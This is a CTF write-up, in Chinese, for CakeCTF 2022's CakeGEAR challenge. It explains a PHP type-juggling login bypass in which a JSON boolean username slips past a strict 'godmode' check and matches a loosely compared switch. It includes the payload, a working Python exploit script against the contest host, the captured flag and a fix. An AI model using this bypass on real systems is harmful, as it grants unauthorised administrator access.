# CakeCTF 2022 CakeGEAR Writeup

## 题目简述

路由器登录接口接收 JSON，并提供 `godmode`、`admin`、`guest` 三种用户名。外部客户端直接提交字符串 `godmode` 会先被严格比较检测并改写成 `nobody`：

```php
if ($req->username === 'godmode'
    && !in_array($_SERVER['REMOTE_ADDR'], ['127.0.0.1', '::1'])) {
    $req->username = 'nobody';
}
```

随后代码却使用 PHP `switch`。`switch/case` 采用宽松比较，而 JSON 可以传入布尔值，不必把用户名限制为字符串。

## 解题过程

提交 JSON 布尔值 `true` 作为用户名：

```json
{"username":true,"password":"whatever"}
```

它与字符串 `godmode` 不满足严格比较：

```php
true === 'godmode'  // false
```

因此不会被外部来源检查改写。进入 `switch` 后则使用宽松比较；当一侧是布尔值时，另一侧会按布尔规则转换，非空字符串 `godmode` 为真：

```php
true == 'godmode'   // true
```

第一个 `case 'godmode'` 因而命中，服务设置：

```php
$_SESSION['login'] = true;
$_SESSION['admin'] = true;
```

利用脚本如下：

```python
import requests

base = "http://web1.2022.cakectf.com:8005"
session = requests.Session()

response = session.post(
    base + "/",
    json={"username": True, "password": "whatever"},
)
response.raise_for_status()
assert response.json()["status"] == "success"

admin = session.get(base + "/admin.php")
admin.raise_for_status()
print(admin.text)
```

管理页面返回：

```text
CakeCTF{y0u_mu5t_c4st_2_STRING_b3f0r3_us1ng_sw1tch_1n_PHP}
```

仓库附带的历史 solver 使用 JSON 数字 `0`。这一写法依赖旧版 PHP 中“非数字字符串与数字”的宽松比较；仓库 Dockerfile 标的是 PHP 8，而 PHP 8 已改变这类数字与非数字字符串比较。布尔值 `true` 才是与当前源码语义一致、无需依赖旧版本行为的 payload。

## 方法总结

漏洞来自同一变量在两处采用不同类型语义：入口防护使用 `===`，后续分派却使用宽松比较的 `switch`。攻击者选择一个不是字符串、但能在宽松比较中匹配首个分支的 JSON 类型，就能绕过前置检查。

修复方式是在解析 JSON 后先验证 `username` 必须是字符串，并使用严格的 `match`、`if/elseif` 加 `===`，或显式白名单映射；不能依赖 `switch` 自动转换输入类型。
